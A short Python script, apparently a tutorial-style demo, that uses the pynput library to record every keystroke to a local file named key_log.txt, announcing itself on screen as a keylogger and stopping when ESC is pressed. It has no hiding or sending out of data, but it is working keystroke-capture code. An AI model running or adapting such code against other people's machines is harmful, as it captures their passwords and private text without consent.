from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")
        
    # Stop logging if ESC is pressed
    if key == keyboard.Key.esc:
        print("❌ ESC pressed. Stopping keylogger...")
        return False  # Returning False stops the listener

# Start listening (listener.join() not required if using 'with')
with keyboard.Listener(on_press=on_press) as listener:
    print("🔐 Keylogger is running. Press ESC to stop...")
    listener.join()
